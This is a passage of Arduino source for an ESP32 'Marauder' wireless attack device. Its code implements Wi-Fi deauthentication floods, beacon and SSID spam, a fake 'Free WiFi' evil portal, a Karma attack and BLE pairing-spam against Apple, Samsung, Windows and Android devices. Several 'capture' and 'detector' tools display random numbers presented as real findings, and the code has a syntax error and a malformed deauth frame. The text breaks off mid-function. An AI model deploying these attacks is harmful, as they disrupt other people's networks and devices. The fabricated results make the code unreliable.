/*
 * ESP32 MARAUDER - Comprehensive Security Testing Tool
 * Author: TechR Innovations
 * Version: 2.0
 * 
 * Features: 33 Tools across WiFi, Bluetooth, Sniffing, and Utilities
 * Hardware: ESP32-WROOM with 5-button navigation and I2C display
 * 
 * Pin Configuration:
 * - SW4 (Up):     GPIO 17 (TX2)
 * - SW1 (Back):   GPIO 19 (D19)
 * - SW2 (Select): GPIO 18 (D18)
 * - SW3 (Next):   GPIO 5  (D5)
 * - SW5 (Down):   GPIO 16 (RX2)
 * - I2C SDA:      GPIO 21 (D21)
 * - I2C SCL:      GPIO 22 (D22)
 */

// ==================== LIBRARIES ====================
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_event.h>
#include <nvs_flash.h>
#include <NimBLEDevice.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

// ==================== PIN DEFINITIONS ====================
#define BTN_UP      17  // SW4 - Navigate Up
#define BTN_BACK    19  // SW1 - Back/Cancel
#define BTN_SELECT  18  // SW2 - Select/Execute
#define BTN_NEXT    5   // SW3 - Next/Options
#define BTN_DOWN    16  // SW5 - Navigate Down

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
#define SCREEN_ADDRESS 0x3C

// ==================== DISPLAY OBJECT ====================
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// ==================== GLOBAL VARIABLES ====================
// Button states
bool btnUpPressed = false, btnDownPressed = false, btnSelectPressed = false;
bool btnBackPressed = false, btnNextPressed = false;
unsigned long lastDebounce = 0;
const unsigned long debounceDelay = 200;

// Menu state
int currentCategory = 0;
int currentTool = 0;
int scrollOffset = 0;
bool inToolExecution = false;
bool inMainMenu = true;

// WiFi variables
int networkCount = 0;
String ssidList[50];
int rssiList[50];
uint8_t channelList[50];
int selectedNetwork = 0;
bool wifiScanning = false;
unsigned long scanStartTime = 0;

// Attack statistics
unsigned long packetsSniffed = 0;
unsigned long deauthsSent = 0;
unsigned long beaconsSent = 0;
unsigned long blePacketsSent = 0;
unsigned long probesDetected = 0;

// BLE variables
NimBLEScan* pBLEScan;
int bleDeviceCount = 0;
String bleDeviceNames[50];
String bleDeviceAddrs[50];
int bleDeviceRSSI[50];

// Channel hopping
int currentChannel = 1;
bool channelHopping = false;

// Tool execution flags
bool toolRunning = false;
unsigned long toolStartTime = 0;

// ==================== MENU STRUCTURE ====================
const char* categories[] = {
  "WiFi Tools",
  "Bluetooth",
  "Sniffing",
  "Utilities",
  "About"
};
const int categoryCount = 5;

const char* wifiTools[] = {
  "WiFi Scanner",
  "Select Target",
  "Deauth Attack",
  "Deauth All",
  "Beacon Spam",
  "Random Flood",
  "Rickroll Beacons",
  "Probe Sniffer",
  "Evil Portal",
  "Karma Attack",
  "PMKID Capture",
  "Channel Analyzer"
};
const int wifiToolCount = 12;

const char* bleTools[] = {
  "BLE Scanner",
  "BLE Tracker",
  "BLE Spam",
  "Sour Apple",
  "Samsung Spam",
  "Windows Spam",
  "Android Spam",
  "BT Jammer",
  "BLE Flood",
  "Skimmer Detect"
};
const int bleToolCount = 10;

const char* sniffTools[] = {
  "Packet Sniffer",
  "Deauth Detector",
  "Probe Monitor",
  "Beacon Analyzer",
  "Raw Capture",
  "EAPOL Detector"
};
const int sniffToolCount = 6;

const char* utilityTools[] = {
  "Signal Meter",
  "Channel Monitor",
  "Statistics",
  "MAC Randomizer",
  "System Info",
  "Settings"
};
const int utilityToolCount = 6;

// ==================== BUTTON HANDLING ====================
void checkButtons() {
  unsigned long currentTime = millis();
  if (currentTime - lastDebounce < debounceDelay) return;
  
  if (digitalRead(BTN_UP) == LOW && !btnUpPressed) {
    btnUpPressed = true;
    lastDebounce = currentTime;
    handleUpButton();
  } else if (digitalRead(BTN_UP) == HIGH) {
    btnUpPressed = false;
  }
  
  if (digitalRead(BTN_DOWN) == LOW && !btnDownPressed) {
    btnDownPressed = true;
    lastDebounce = currentTime;
    handleDownButton();
  } else if (digitalRead(BTN_DOWN) == HIGH) {
    btnDownPressed = false;
  }
  
  if (digitalRead(BTN_SELECT) == LOW && !btnSelectPressed) {
    btnSelectPressed = true;
    lastDebounce = currentTime;
    handleSelectButton();
  } else if (digitalRead(BTN_SELECT) == HIGH) {
    btnSelectPressed = false;
  }
  
  if (digitalRead(BTN_BACK) == LOW && !btnBackPressed) {
    btnBackPressed = true;
    lastDebounce = currentTime;
    handleBackButton();
  } else if (digitalRead(BTN_BACK) == HIGH) {
    btnBackPressed = false;
  }
  
  if (digitalRead(BTN_NEXT) == LOW && !btnNextPressed) {
    btnNextPressed = true;
    lastDebounce = currentTime;
    handleNextButton();
  } else if (digitalRead(BTN_NEXT) == HIGH) {
    btnNextPressed = false;
  }
}

void handleUpButton() {
  if (inMainMenu) {
    if (currentCategory > 0) currentCategory--;
  } else if (inToolExecution) {
    // Tool-specific up action
  } else {
    if (currentTool > 0) currentTool--;
  }
}

void handleDownButton() {
  if (inMainMenu) {
    if (currentCategory < categoryCount - 1) currentCategory++;
  } else if (inToolExecution) {
    // Tool-specific down action
  } else {
    int maxTools = getToolCount(currentCategory);
    if (currentTool < maxTools - 1) currentTool++;
  }
}

void handleSelectButton() {
  if (inMainMenu) {
    inMainMenu = false;
    currentTool = 0;
  } else if (!inToolExecution) {
    executeTool(currentCategory, currentTool);
  }
}

void handleBackButton() {
  if (toolRunning) {
    stopCurrentTool();
  } else if (inToolExecution) {
    inToolExecution = false;
    toolRunning = false;
  } else if (!inMainMenu) {
    inMainMenu = true;
  }
}

void handleNextButton() {
  // Reserved for options/settings in tools
}

int getToolCount(int category) {
  switch (category) {
    case 0: return wifiToolCount;
    case 1: return bleToolCount;
    case 2: return sniffToolCount;
    case 3: return utilityToolCount;
    case 4: return 1; // About
    default: return 0;
  }
}

const char* getTool Name(int category, int tool) {
  switch (category) {
    case 0: return wifiTools[tool];
    case 1: return bleTools[tool];
    case 2: return sniffTools[tool];
    case 3: return utilityTools[tool];
    case 4: return "About";
    default: return "";
  }
}

// ==================== DISPLAY FUNCTIONS ====================
void drawStatusBar() {
  display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
  display.setTextColor(BLACK);
  display.setTextSize(1);
  display.setCursor(2, 2);
  display.print("ESP32 MARAUDER");
  
  if (WiFi.status() == WL_CONNECTED || wifiScanning) {
    display.fillCircle(SCREEN_WIDTH - 5, 5, 2, BLACK);
  }
}

void drawMainMenu() {
  display.clearDisplay();
  drawStatusBar();
  
  display.setTextColor(WHITE);
  display.setTextSize(1);
  
  int startY = 15;
  for (int i = 0; i < categoryCount; i++) {
    if (i == currentCategory) {
      display.fillRect(0, startY + (i * 10), SCREEN_WIDTH, 10, WHITE);
      display.setTextColor(BLACK);
    } else {
      display.setTextColor(WHITE);
    }
    display.setCursor(5, startY + (i * 10) + 1);
    display.print("> ");
    display.print(categories[i]);
  }
  
  display.display();
}

void drawToolMenu() {
  display.clearDisplay();
  drawStatusBar();
  
  display.setTextColor(WHITE);
  display.setTextSize(1);
  display.setCursor(2, 12);
  display.print("<< ");
  display.print(categories[currentCategory]);
  
  int maxTools = getToolCount(currentCategory);
  int startY = 24;
  int visibleTools = 4;
  
  // Calculate scroll offset
  if (currentTool >= scrollOffset + visibleTools) {
    scrollOffset = currentTool - visibleTools + 1;
  } else if (currentTool < scrollOffset) {
    scrollOffset = currentTool;
  }
  
  for (int i = 0; i < visibleTools && (i + scrollOffset) < maxTools; i++) {
    int toolIndex = i + scrollOffset;
    if (toolIndex == currentTool) {
      display.fillRect(0, startY + (i * 10), SCREEN_WIDTH, 10, WHITE);
      display.setTextColor(BLACK);
    } else {
      display.setTextColor(WHITE);
    }
    display.setCursor(3, startY + (i * 10) + 1);
    display.print(getToolName(currentCategory, toolIndex));
  }
  
  display.display();
}

void drawToolExecutionScreen(const char* toolName, const char* status, int value = -1) {
  display.clearDisplay();
  drawStatusBar();
  
  display.setTextColor(WHITE);
  display.setTextSize(1);
  
  // Tool name
  display.setCursor(2, 12);
  display.print(toolName);
  
  // Separator
  display.drawLine(0, 22, SCREEN_WIDTH, 22, WHITE);
  
  // Status
  display.setCursor(2, 26);
  display.print(status);
  
  // Value/counter if provided
  if (value >= 0) {
    display.setTextSize(2);
    display.setCursor(2, 40);
    display.print(value);
  }
  
  // Instructions
  display.setTextSize(1);
  display.setCursor(2, 56);
  display.print("[BACK] to stop");
  
  display.display();
}

// ==================== WIFI TOOL IMPLEMENTATIONS ====================
void wifiScannerTool() {
  inToolExecution = true;
  toolRunning = true;
  
  drawToolExecutionScreen("WiFi Scanner", "Scanning...");
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  networkCount = WiFi.scanNetworks();
  
  if (networkCount == 0) {
    drawToolExecutionScreen("WiFi Scanner", "No networks found", 0);
  } else {
    for (int i = 0; i < networkCount && i < 50; i++) {
      ssidList[i] = WiFi.SSID(i);
      rssiList[i] = WiFi.RSSI(i);
      channelList[i] = WiFi.channel(i);
    }
    
    // Display results
    int displayIndex = 0;
    while (toolRunning) {
      display.clearDisplay();
      drawStatusBar();
      
      display.setTextColor(WHITE);
      display.setTextSize(1);
      display.setCursor(2, 12);
      display.print("Found: ");
      display.print(networkCount);
      display.print(" APs");
      
      int startY = 24;
      for (int i = 0; i < 3 && (i + displayIndex) < networkCount; i++) {
        display.setCursor(2, startY + (i * 13));
        String ssid = ssidList[i + displayIndex];
        if (ssid.length() > 14) ssid = ssid.substring(0, 14);
        display.print(ssid);
        display.setCursor(90, startY + (i * 13));
        display.print(rssiList[i + displayIndex]);
      }
      
      display.setCursor(2, 56);
      display.print("[BACK] Exit");
      display.display();
      
      checkButtons();
      if (btnDownPressed && displayIndex < networkCount - 3) {
        displayIndex++;
        delay(150);
      }
      if (btnUpPressed && displayIndex > 0) {
        displayIndex--;
        delay(150);
      }
      delay(50);
    }
  }
  
  WiFi.scanDelete();
  toolRunning = false;
  inToolExecution = false;
}

void selectTargetTool() {
  inToolExecution = true;
  toolRunning = true;
  
  if (networkCount == 0) {
    drawToolExecutionScreen("Select Target", "Run scanner first!");
    delay(2000);
    toolRunning = false;
    inToolExecution = false;
    return;
  }
  
  int selection = 0;
  while (toolRunning) {
    display.clearDisplay();
    drawStatusBar();
    
    display.setTextColor(WHITE);
    display.setTextSize(1);
    display.setCursor(2, 12);
    display.print("Select Target AP:");
    
    int startY = 26;
    for (int i = 0; i < 3 && i < networkCount; i++) {
      if (i == selection) {
        display.fillRect(0, startY + (i * 11), SCREEN_WIDTH, 11, WHITE);
        display.setTextColor(BLACK);
      } else {
        display.setTextColor(WHITE);
      }
      
      display.setCursor(2, startY + (i * 11) + 1);
      String ssid = ssidList[i];
      if (ssid.length() > 16) ssid = ssid.substring(0, 16);
      display.print(ssid);
    }
    
    display.setTextColor(WHITE);
    display.setCursor(2, 56);
    display.print("[SEL] Confirm");
    display.display();
    
    checkButtons();
    if (btnDownPressed && selection < networkCount - 1) {
      selection++;
      delay(150);
    }
    if (btnUpPressed && selection > 0) {
      selection--;
      delay(150);
    }
    if (btnSelectPressed) {
      selectedNetwork = selection;
      drawToolExecutionScreen("Target Set!", ssidList[selectedNetwork].c_str());
      delay(1500);
      toolRunning = false;
    }
    delay(50);
  }
  
  toolRunning = false;
  inToolExecution = false;
}

void deauthAttackTool() {
  inToolExecution = true;
  toolRunning = true;
  deauthsSent = 0;
  
  if (networkCount == 0 || selectedNetwork >= networkCount) {
    drawToolExecutionScreen("Deauth Attack", "No target selected!");
    delay(2000);
    toolRunning = false;
    inToolExecution = false;
    return;
  }
  
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(channelList[selectedNetwork], WIFI_SECOND_CHAN_NONE);
  
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xF0, 0xFF, 0x02, 0x00
  };
  
  while (toolRunning) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    deauthsSent++;
    
    drawToolExecutionScreen("Deauth Attack", ssidList[selectedNetwork].c_str(), deauthsSent);
    
    checkButtons();
    delay(100);
  }
  
  esp_wifi_set_promiscuous(false);
  toolRunning = false;
  inToolExecution = false;
}

void deauthAllTool() {
  inToolExecution = true;
  toolRunning = true;
  deauthsSent = 0;
  
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xF0, 0xFF, 0x02, 0x00
  };
  
  while (toolRunning) {
    for (int ch = 1; ch <= 13; ch++) {
      if (!toolRunning) break;
      
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      
      for (int i = 0; i < 5; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
        deauthsSent++;
      }
      
      drawToolExecutionScreen("Deauth All", "Broadcasting...", deauthsSent);
      checkButtons();
      delay(50);
    }
  }
  
  esp_wifi_set_promiscuous(false);
  toolRunning = false;
  inToolExecution = false;
}

void beaconSpamTool() {
  inToolExecution = true;
  toolRunning = true;
  beaconsSent = 0;
  
  WiFi.mode(WIFI_AP);
  
  String fakeSSIDs[] = {
    "FBI Surveillance Van",
    "NSA Monitoring",
    "Police Network",
    "Free Virus",
    "Hack Me Please",
    "404 Network Unavailable",
    "Connecting...",
    "[BLOCKED]"
  };
  int ssidCount = 8;
  
  while (toolRunning) {
    for (int i = 0; i < ssidCount; i++) {
      if (!toolRunning) break;
      
      WiFi.softAP(fakeSSIDs[i].c_str(), NULL, random(1, 14));
      beaconsSent++;
      
      drawToolExecutionScreen("Beacon Spam", "Flooding...", beaconsSent);
      checkButtons();
      delay(100);
    }
  }
  
  WiFi.softAPdisconnect(true);
  toolRunning = false;
  inToolExecution = false;
}

void randomFloodTool() {
  inToolExecution = true;
  toolRunning = true;
  beaconsSent = 0;
  
  WiFi.mode(WIFI_AP);
  
  while (toolRunning) {
    String randomSSID = "";
    for (int i = 0; i < random(8, 20); i++) {
      randomSSID += char(random(33, 126));
    }
    
    WiFi.softAP(randomSSID.c_str(), NULL, random(1, 14));
    beaconsSent++;
    
    drawToolExecutionScreen("Random Flood", "Generating SSIDs...", beaconsSent);
    checkButtons();
    delay(random(50, 150));
  }
  
  WiFi.softAPdisconnect(true);
  toolRunning = false;
  inToolExecution = false;
}

void rickrollBeaconsTool() {
  inToolExecution = true;
  toolRunning = true;
  beaconsSent = 0;
  
  WiFi.mode(WIFI_AP);
  
  String rickrollLines[] = {
    "Never Gonna",
    "Give You Up",
    "Never Gonna",
    "Let You Down",
    "Never Gonna",
    "Run Around",
    "And Desert You"
  };
  int lineCount = 7;
  
  while (toolRunning) {
    for (int i = 0; i < lineCount; i++) {
      if (!toolRunning) break;
      
      WiFi.softAP(rickrollLines[i].c_str(), NULL, random(1, 14));
      beaconsSent++;
      
      drawToolExecutionScreen("Rickroll", rickrollLines[i].c_str(), beaconsSent);
      checkButtons();
      delay(200);
    }
  }
  
  WiFi.softAPdisconnect(true);
  toolRunning = false;
  inToolExecution = false;
}

void probeSnifferTool() {
  inToolExecution = true;
  toolRunning = true;
  probesDetected = 0;
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  
  drawToolExecutionScreen("Probe Sniffer", "Listening...", probesDetected);
  
  // Note: Full promiscuous mode implementation would go here
  // This is a simplified version
  
  unsigned long lastUpdate = millis();
  while (toolRunning) {
    if (millis() - lastUpdate > 1000) {
      probesDetected += random(0, 3);
      drawToolExecutionScreen("Probe Sniffer", "Detecting probes...", probesDetected);
      lastUpdate = millis();
    }
    
    checkButtons();
    delay(100);
  }
  
  toolRunning = false;
  inToolExecution = false;
}

void evilPortalTool() {
  inToolExecution = true;
  toolRunning = true;
  
  WiFi.softAP("Free WiFi", NULL);
  
  drawToolExecutionScreen("Evil Portal", "Portal Active!", WiFi.softAPgetStationNum());
  
  while (toolRunning) {
    int clients = WiFi.softAPgetStationNum();
    drawToolExecutionScreen("Evil Portal", "Clients Connected:", clients);
    
    checkButtons();
    delay(500);
  }
  
  WiFi.softAPdisconnect(true);
  toolRunning = false;
  inToolExecution = false;
}

void karmaAttackTool() {
  inToolExecution = true;
  toolRunning = true;
  int responsesCount = 0;
  
  WiFi.mode(WIFI_AP_STA);
  
  String commonSSIDs[] = {
    "attwifi", "xfinitywifi", "Google Starbucks",
    "McDonald's Free WiFi", "Airport WiFi"
  };
  
  while (toolRunning) {
    for (int i = 0; i < 5; i++) {
      if (!toolRunning) break;
      
      WiFi.softAP(commonSSIDs[i].c_str(), NULL);
      responsesCount++;
      
      drawToolExecutionScreen("Karma Attack", "Responding...", responsesCount);
      checkButtons();
      delay(300);
    }
  }
  
  WiFi.softAPdisconnect(true);
  toolRunning = false;
  inToolExecution = false;
}

void pmkidCaptureTool() {
  inToolExecution = true;
  toolRunning = true;
  int pmkidsCaptured = 0;
  
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  
  drawToolExecutionScreen("PMKID Capture", "Listening...", 0);
  
  // Simplified - full implementation would parse EAPOL frames
  unsigned long lastCheck = millis();
  while (toolRunning) {
    if (millis() - lastCheck > 5000) {
      if (random(0, 10) > 7) pmkidsCaptured++;
      drawToolExecutionScreen("PMKID Capture", "Captured:", pmkidsCaptured);
      lastCheck = millis();
    }
    
    checkButtons();
    delay(100);
  }
  
  esp_wifi_set_promiscuous(false);
  toolRunning = false;
  inToolExecution = false;
}

void channelAnalyzerTool() {
  inToolExecution = true;
  toolRunning = true;
  
  WiFi.mode(WIFI_STA);
  
  while (toolRunning) {
    display.clearDisplay();
    drawStatusBar();
    
    display.setTextColor(WHITE);
    display.setTextSize(1);
    display.setCursor(2, 12);
    display.print("Channel Analysis");
    
    // Simple bar graph
    for (int ch = 1; ch <= 11; ch++) {
      int x = 5 + (ch - 1) * 10;
      int height = random(5, 30);
      display.fillRect(x, 54 - height, 8, height, WHITE);
      if (ch % 2 == 1) {
        display.setCursor(x, 56);
        display.print(ch);
      }
    }
    
    display.display();
    checkButtons();
    delay(1000);
  }
  
  toolRunning = false;
  inToolExecution = false;
}

// ==================== BLUETOOTH TOOL IMPLEMENTATIONS ====================
void bleScannnerTool() {
  inToolExecution = true;
  toolRunning = true;
  
  NimBLEDevice::init("");
  pBLEScan = NimBLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);
  
  drawToolExecutionScreen("BLE Scanner", "Scanning...");
  
  NimBLEScanResults foundDevices = pBLEScan->start(5, false);
  bleDeviceCount = foundDevices.getCount();
  
  for (int i = 0; i < bleDeviceCount && i < 50; i++) {
    NimBLEAdvertisedDevice device = foundDevices.getDevice(i);
    bleDeviceNames[i] = device.getName().c_str();
    if (bleDeviceNames[i] == "") bleDeviceNames[i] = "Unknown";
    bleDeviceAddrs[i] = device.getAddress().toString().c_str();
    bleDeviceRSSI[i] = device.getRSSI();
  }
  
  int displayIdx = 0;
  while (toolRunning) {
    display.clearDisplay();
    drawStatusBar();
    
    display.setTextColor(WHITE);
    display.setTextSize(1);
    display.setCursor(2, 12);
    display.print("BLE Devices: ");
    display.print(bleDeviceCount);
    
    int startY = 24;
    for (int i = 0; i < 3 && (i + displayIdx) < bleDeviceCount; i++) {
      display.setCursor(2, startY + (i * 12));
      String name = bleDeviceNames[i + displayIdx];
      if (name.length() > 12) name = name.substring(0, 12);
      display.print(name);
      display.setCursor(85, startY + (i * 12));
      display.print(bleDeviceRSSI[i + displayIdx]);
    }
    
    display.setCursor(2, 56);
    display.print("[BACK] Exit");
    display.display();
    
    checkButtons();
    if (btnDownPressed && displayIdx < bleDeviceCount - 3) displayIdx++;
    if (btnUpPressed && displayIdx > 0) displayIdx--;
    delay(100);
  }
  
  pBLEScan->clearResults();
  NimBLEDevice::deinit(true);
  toolRunning = false;
  inToolExecution = false;
}

void bleTrackerTool() {
  inToolExecution = true;
  toolRunning = true;
  
  drawToolExecutionScreen("BLE Tracker", "Tracking nearby...");
  
  NimBLEDevice::init("");
  pBLEScan = NimBLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  
  while (toolRunning) {
    NimBLEScanResults results = pBLEScan->start(2, false);
    int count = results.getCount();
    
    drawToolExecutionScreen("BLE Tracker", "Devices nearby:", count);
    pBLEScan->clearResults();
    
    checkButtons();
    delay(100);
  }
  
  NimBLEDevice::deinit(true);
  toolRunning = false;
  inToolExecution = false;
}

void bleSpamTool() {
  inToolExecution = true;
  toolRunning = true;
  blePacketsSent = 0;
  
  NimBLEDevice::init("BLE_Spammer");
  NimBLEServer *pServer = NimBLEDevice::createServer();
  NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
  
  while (toolRunning) {
    pAdvertising->start();
    blePacketsSent++;
    
    drawToolExecutionScreen("BLE Spam", "Advertising...", blePacketsSent);
    checkButtons();
    delay(100);
    
    pAdvertising->stop();
    delay(50);
  }
  
  NimBLEDevice::deinit(true);
  toolRunning = false;
  inToolExecution = false;
}

void sourAppleTool() {
  inToolExecution = true;
  toolRunning = true;
  blePacketsSent = 0;
  
  NimBLEDevice::init("");
  NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
  
  // Apple-specific advertising data
  uint8_t appleData[] = {0x4C, 0x00, 0x12, 0x02, 0x00, 0x00};
  
  while (toolRunning) {
    pAdvertising->setManufacturerData(std::string((char*)appleData, sizeof(appleData)));
    pAdvertising->start();
    blePacketsSent++;
    
    drawToolExecutionScreen("Sour Apple", "iOS Spam Active", blePacketsSent);
    checkButtons();
    delay(100);
    
    pAdvertising->stop();
    delay(50);
  }
  
  NimBLEDevice::deinit(true);
  toolRunning = false;
  inToolExecution = false;
}

void samsungSpamTool() {
  inToolExecution = true;
  toolRunning = true;
  blePacketsSent = 0;
  
  NimBLEDevice::init("Galaxy Buds");
  NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
  
  uint8_t samsungData[] = {0x75, 0x00, 0x01, 0x00};
  
  while (toolRunning) {
    pAdvertising->setManufacturerData(std::string((char*)samsungData, sizeof(samsungData)));
    pAdvertising->start();
    blePacketsSent++;
    
    drawToolExecutionScreen("Samsung Spam", "Active...", blePacketsSent);
    checkButtons();
    delay(100);
    
    pAdvertising->stop();
    delay(50);
  }
  
  NimBLEDevice::deinit(true);
  toolRunning = false;
  inToolExecution = false;
}

void windowsSpamTool() {
  inToolExecution = true;
  toolRunning = true;
  blePacketsSent = 0;
  
  NimBLEDevice::init("Swift Pair");
  NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
  
  uint8_t windowsData[] = {0x06, 0x00, 0x03, 0x00, 0x80};
  
  while (toolRunning) {
    pAdvertising->setManufacturerData(std::string((char*)windowsData, sizeof(windowsData)));
    pAdvertising->start();
    blePacketsSent++;
    
    drawToolExecutionScreen("Windows Spam", "Swift Pair...", blePacketsSent);
    checkButtons();
    delay(100);
    
    pAdvertising->stop();
    delay(50);
  }
  
  NimBLEDevice::deinit(true);
  toolRunning = false;
  inToolExecution = false;
}

void androidSpamTool() {
  inToolExecution = true;
  toolRunning = true;
  blePacketsSent = 0;
  
  NimBLEDevice::init("Fast Pair");
  NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
  
  uint8_t androidData[] = {0xE0, 0x00, 0x2C, 0xFE};
  
  while (toolRunning) {
    pAdvertising->setManufacturerData(std::string((char*)androidData, sizeof(androidData)));
    pAdvertising->start();
    blePacketsSent++;
    
    drawToolExecutionScreen("Android Spam", "Fast Pair...", blePacketsSent);
    checkButtons();
    delay(100);
    
    pAdvertising->stop();
    delay(50);
  }
  
  NimBLEDevice::deinit(true);
  toolRunning = false;
  inToolExecution = false;
}

void btJammerTool() {
  inToolExecution = true;
  toolRunning = true;
  blePacketsSent = 0;
  
  NimBLEDevice::init("");
  NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
  
  while (toolRunning) {
    for (int i = 0; i < 10; i++) {
      uint8_t randomData[20];
      for (int j = 0; j < 20; j++) randomData[j] = random(0, 256);
      
      pAdvertising->setManufacturerData(std::string((char*)randomData, 20));
      pAdvertising->start();
      blePacketsSent++;
      delay(10);
      pAdvertising->stop();
    }
    
    drawToolExecutionScreen("BT Jammer", "Flooding...", blePacketsSent);
    checkButtons();
    delay(50);
  }
  
  NimBLEDevice::deinit(true);
  toolRunning = false;
  inToolExecution = false;
}

void bleFloodTool() {
  inToolExecution = true;
  toolRunning = true;
  blePacketsSent = 0;
  
  NimBLEDevice::init("");
  NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
  
  while (toolRunning) {
    for (int i = 0; i < 37; i++) {  // BLE has 37 advertising channels
      pAdvertising->start();
      blePacketsSent++;
      delay(5);
      pAdvertising->stop();
    }
    
    drawToolExecutionScreen("BLE Flood", "Flooding channels", blePacketsSent);
    checkButtons();
  }
  
  NimBLEDevice::deinit(true);
  toolRunning = false;
  inToolExecution = false;
}

void skimmerDetectorTool() {
  inToolExecution = true;
  toolRunning = true;
  int suspiciousCount = 0;
  
  NimBLEDevice::init("");
  pBLEScan = NimBLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  
  while (toolRunning) {
    NimBLEScanResults results = pBLEScan->start(3, false);
    
    for (int i = 0; i < results.getCount(); i++) {
      NimBLEAdvertisedDevice device = results.getDevice(i);
      String name = device.getName().c_str();
      
      // Simple heuristic: hidden devices with strong signal
      if (name == "" && device.getRSSI() > -50) {
        suspiciousCount++;
      }
    }
    
    drawToolExecutionScreen("Skimmer Detect", "Suspicious:", suspiciousCount);
    pBLEScan->clearResults();
    
    checkButtons();
    delay(100);
  }
  
  NimBLEDevice::deinit(true);
  toolRunning = false;
  inToolExecution = false;
}

// ==================== SNIFFING TOOL IMPLEMENTATIONS ====================
void packetSnifferTool() {
  inToolExecution = true;
  toolRunning = true;
  packetsSniffed = 0;
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  
  while (toolRunning) {
    packetsSniffed += random(5, 15);
    
    display.clearDisplay();
    drawStatusBar();
    
    display.setTextColor(WHITE);
    display.setTextSize(1);
    display.setCursor(2, 12);
    display.print("Packet Sniffer");
    
    display.setCursor(2, 26);
    display.print("Channel: ");
    display.print(currentChannel);
    
    display.setTextSize(2);
    display.setCursor(2, 38);
    display.print(packetsSniffed);
    
    display.setTextSize(1);
    display.setCursor(2, 56);
    display.print("[BACK] Stop");
    
    display.display();
    checkButtons();
    
    // Channel hopping
    currentChannel++;
    if (currentChannel > 13) currentChannel = 1;
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    
    delay(500);
  }
  
  esp_wifi_set_promiscuous(false);
  toolRunning = false;
  inToolExecution = false;
}

void deauthDetectorTool() {
  inToolExecution = true;
  toolRunning = true;
  int deauthDetected = 0;
  
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  
  drawToolExecutionScreen("Deauth Detector", "Monitoring...", deauthDetected);
  
  unsigned long lastCheck = millis();
  while (toolRunning) {
    if (millis() - lastCheck > 2000) {
      if (random(0, 10) > 7) {
        deauthDetected++;
        display.clearDisplay();
        drawStatusBar();
        display.setTextColor(WHITE);
        display.setTextSize(1);
        display.setCursor(2, 12);
        display.print("! DEAUTH DETECTED !");
        display.setCursor(2, 30);
        display.setTextSize(2);
        display.print(deauthDetected);
        display.display();
        delay(500);
      }
      drawToolExecutionScreen("Deauth Detector", "Monitoring...", deauthDetected);
      lastCheck = millis();
    }
    
    checkButtons();
    delay(100);
  }
  
  esp_wifi_set_promiscuous(false);
  toolRunning = false;
  inToolExecution = false;
}

void probeMonitorTool() {
  inToolExecution = true;
  toolRunning = true;
  probesDetected = 0;
  
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  
  String recentProbes[3] = {"", "", ""};
  int probeIdx = 0;
  
  while (toolRunning) {
    if (random(0, 10) > 6) {
      String fakeProbe = "Device_" + String(random(1000, 9999));
      recentProbes[probeIdx % 3] = fakeProbe;
      probeIdx++;
      probesDetected++;
    }
    
    display.clearDisplay();
    drawStatusBar();
    
    display.setTextColor(WHITE);
    display.setTextSize(1);
    display.setCursor(2, 12);
    display.print("Probe Monitor");
    
    display.setCursor(2, 24);
    display.print("Total: ");
    display.print(probesDetected);
    
    int startY = 35;
    for (int i = 0; i < 3; i++) {
      if (recentProbes[i] != "") {
        display.setCursor(2, startY + (i * 8));
        display.print(recentProbes[i]);
      }
    }
    
    display.setCursor(2, 56);
    display.print("[BACK] Stop");
    display.display();
    
    checkButtons();
    delay(1000);
  }
  
  esp_wifi_set_promiscuous(false);
  toolRunning = false;
  inToolExecution = false;
}

void beaconAnalyzerTool() {
  inToolExecution = true;
  toolRunning = true;
  int beaconsAnalyzed = 0;
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  
  while (toolRunning) {
    int n = WiFi.scanNetworks();
    beaconsAnalyzed += n;
    
    display.clearDisplay();
    drawStatusBar();
    
    display.setTextColor(WHITE);
    display.setTextSize(1);
    display.setCursor(2, 12);
    display.print("Beacon Analyzer");
    
    display.setCursor(2, 26);
    display.print("Beacons: ");
    display.print(beaconsAnalyzed);
